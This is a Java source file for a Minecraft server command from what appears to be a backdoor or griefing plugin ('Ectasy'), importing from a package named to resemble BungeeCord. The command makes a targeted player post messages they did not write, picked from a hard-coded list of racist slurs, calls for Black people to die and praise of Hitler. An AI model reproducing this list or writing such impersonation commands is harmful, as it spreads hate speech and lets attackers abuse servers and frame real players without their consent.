package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "racism",
   description = "Makes a player send racist messages",
   blatant = true,
   rank = Rank.FREE
)
public class RacismCommand extends AbstractCommand {
   public List<String> messages = Arrays.asList(
      "White supremacy should be a constitutional right",
      "I hate all niggers",
      "I hate black people",
      "White > Black",
      "niggers should kill themselves",
      "why did we abolished slavery?",
      "niggers are just slaves",
      "black people are just slaves",
      "if you like black people, you should die",
      "only black people are slaves",
      "I absolutely hate how our country is invaded by niggers",
      "I absolutely hate how our country is invaded by black people",
      "Donald Trump's wall was a great idea",
      "We should make a wall to separate black and white people",
      "Racism 4 Life",
      "Go back to your country, poor nigger",
      "Hitler did nothing wrong, why do you all hate him?",
      "Hitler made the right choice",
      "I love racism",
      "All you niggers should go back to where you came from"
   );

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Usage : racism <player>");
      } else {
         Player var4 = Bukkit.getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "Player" + var3[0] + " is not online!");
         } else {
            Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
               var4.chat(this.messages.get(ThreadLocalRandom.current().nextInt(0, this.messages.size())));
            });
         }
      }
   }
}
